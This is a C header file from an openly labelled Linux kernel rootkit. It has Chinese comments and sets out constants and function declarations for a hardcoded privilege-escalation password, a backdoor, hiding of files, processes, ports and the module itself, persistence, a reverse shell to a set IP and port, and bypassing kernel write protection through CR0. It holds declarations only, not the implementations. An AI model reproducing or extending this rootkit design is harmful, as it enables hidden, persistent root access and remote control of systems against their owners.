#ifndef HIDE_H
#define HIDE_H

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/notifier.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <net/tcp.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <net/sock.h>
#include <linux/moduleparam.h>

#include <linux/unistd.h>
#include <linux/file.h>
#include <asm/uaccess.h>
#include <asm/processor.h>

#include <asm-generic/barrier.h>
#include <linux/syscalls.h>
#include <linux/linkage.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/signal.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Eidos");
MODULE_DESCRIPTION("LKM Rootkit - Hide Part");

/* ---------------------------- *
 *            宏定义            * 
 * ---------------------------- */

// 提权所需口令
#define PASSWORD "ELPSYKONGROO"
#define BACKDOOR "STEINSGATE" // 后门需要藏好
#define BACKDOOR_PATH "/proc" // 因此需要特地先藏好这个文件路径

// 模块隐藏所需参数
#define MODULE_NAME "hide" // 模块名称记为hide（可修改）
#define ROOT_PATH "/sys/module" // 使用文件隐藏方式隐藏模块的路径
#define PROC_PATH "/proc/modules" // 使用进程模块隐藏方式隐藏路径

// 端口隐藏所需参数
#define TCP4_NET_ENTRY "/proc/net/tcp"
#define TCP6_NET_ENTRY "/proc/net/tcp6"
#define UDP4_NET_ENTRY "/proc/net/udp"
#define UDP6_NET_ENTRY "/proc/net/udp6"
#define NEEDLE_LEN 6

// 进程隐藏所需参数
#define PROC_HIDE_PATH "/proc"

// reverse shell.
#define REVERSE_SHELL_IP "127.0.0.1"
#define REVERSE_SHELL_PORT "5888"

/* -------------------------------------- *
 *              功能模块                   *
 * -------------------------------------- */

// 后门添加
void backdoor(void);
void cleanbackdoor(void);

// 取代下一个模块的正常功能
void disable_module(void);
void disable_module_exit(void);

// 文件隐藏
void hide_file(void);
void hide_file_cleanup(void);

// hide process
void proc_hide(void);
void proc_unhide(void);

// hide ports.
void port_hide(void);
void port_unhide(void);

// hide mod
void mod_hide(void);
void mod_unhide(void);

// consistency
void keep_rootkit(void);

// shellreverse
int shellreverse_init(void);
void shellreverse_exit(void);

// protect.
void write_cr0_forced(unsigned long val);
void unprotect_memory(void);
void protect_memory(void);

#endif